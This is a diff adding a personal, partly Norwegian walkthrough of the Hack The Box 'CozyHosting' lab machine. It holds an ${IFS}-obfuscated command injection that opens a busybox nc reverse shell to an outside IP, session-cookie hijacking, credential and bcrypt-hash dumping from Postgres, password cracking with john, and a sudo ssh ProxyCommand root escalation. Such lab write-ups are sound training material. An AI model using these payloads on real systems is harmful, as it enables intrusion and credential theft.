@@ -1,0 +1,143 @@
+# cozyHosting
+
+### Burpsuite
+
+```bash
+Henter cookie fra http://cozyhosting.htb/actuator/sessions
+
+Deretter så bruker man "interception on"
+
+http://cozyhosting.htb/admin
+
+Endrer cookie til den vi fant, så trykker vi på "forward"
+
+I burpsuite så 
+```
+
+### lager en lytter (min maskin)
+
+```bash
+nc -lvnp 4444(port_nummer)
+```
+
+### reverse shell
+
+```bash
+
+$(busybox${IFS}nc${IFS}10.10.16.134${IFS}4444${IFS}-e${IFS}sh)
+
+$(busybox${IFS}nc${IFS}10.10.16.3${IFS}4444${IFS}-e${IFS}sh)
+
+source 
+https://www.revshells.com/ 
+https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions 
+
+```
+
+### fixing the look of the terminal
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")' 
+export TERM=xterm 
+
+CTRL+z 
+
+stty raw -echo;fg
+```
+
+# privilege escalation from app to user
+
+```bash
+app@cozyhosting:/tmp$ unzip cloudhosting-0.0.1.jar
+
+app@cozyhosting:/tmp$ grep -r "password" .
+
+app@cozyhosting:/tmp$ grep -r "josh" / 2>/dev/null
+
+josh sin userid = 1003
+version  = Ubuntu 22.04.3 LTS \n \l
+kernel version = 64 bit
+
+kanskje denne
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxRapp@cozyhosting:/tmp/BOOT-INF/classes$
+
+source 
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
+```
+
+```bash
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxRapp@cozyhosting:/tmp/BOOT-INF/classes$
+app@cozyhosting:/tmp/BOOT-INF/classes$ psql -U postgres -d cozyhosting
+psql: error: connection to server on socket "/var/run/postgresql/.s.PGSQL.5432" failed: FATAL:  Peer authentication failed for user "postgres"
+app@cozyhosting:/tmp/BOOT-INF/classes$ psql h localhost -U postgres
+psql: warning: extra command-line argument "localhost" ignored
+psql: error: connection to server on socket "/var/run/postgresql/.s.PGSQL.5432" failed: FATAL:  Peer authentication failed for user "postgres"
+app@cozyhosting:/tmp/BOOT-INF/classes$ psql -h localhost -U postgres
+Password for user postgres:
+psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+postgres=#
+```
+
+```bash
+^
+postgres=# \l
+postgres=# \c cozyhosting
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+You are now connected to database "cozyhosting" as user "postgres".
+cozyhosting=#
+```
+
+```bash
+name    |                           password                           | role
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+
+id | username  |      hostname
+----+-----------+--------------------
+  1 | kanderson | suspicious mcnulty
+  5 | kanderson | boring mahavira
+  6 | kanderson | stoic varahamihira
+  7 | kanderson | awesome lalande
+(4 rows)
+```
+
+```bash
+$2a$1 vil si at det er bcrypt hash
+10 er første nummeret. Det vil si at  hashen ble laget med en fakotor av 10
+
+──(johems㉿BeastJohe)-[~/HB/CozyHosting]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+manchesterunited (?)
+1g 0:00:00:06 DONE (2023-10-08 15:16) 0.1529g/s 440.3p/s 440.3c/s 440.3C/s onlyme..soccer9
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+┌──(johems㉿BeastJohe)-[~/HB/CozyHosting]
+└─$ ssh josh@10.129.198.143
+
+password = manchesterunited 
+```
+
+# privilege escalation from user to rootsudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+source 
+https://gtfobins.github.io/gtfobins/ssh/ 
